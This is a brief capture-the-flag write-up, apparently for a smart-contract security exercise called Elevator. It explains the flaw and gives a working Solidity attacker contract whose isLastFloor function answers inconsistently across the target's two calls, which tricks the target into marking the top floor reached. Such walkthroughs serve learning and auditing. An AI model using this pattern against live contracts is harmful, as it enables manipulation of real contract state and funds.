#Elevator

In this level we can see that the function isLastFloor is called twice.
This means that we can create our own logic for the function since it is
relying on the caller to be a Building.

We use a simple check to see if the floor we are on is the floor that is called.
Since it's not we can return false and set our floor to the floor that is called.
Now, when the function is called again, it will return true.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
interface Elevator {
    function goTo(uint) external;
}

contract Building{
    uint floorChange;
    address immutable i_elevatorAddress;
    constructor(address _elevatorAddress) {
        i_elevatorAddress = _elevatorAddress;
    }
    function isLastFloor(uint _floor) public returns (bool) {
        if(floorChange == _floor) {
            return true;
        }
        floorChange = _floor;
        return false;
    }

    function go(uint _floor) public {
        Elevator(i_elevatorAddress).goTo(_floor);
    }
}
```
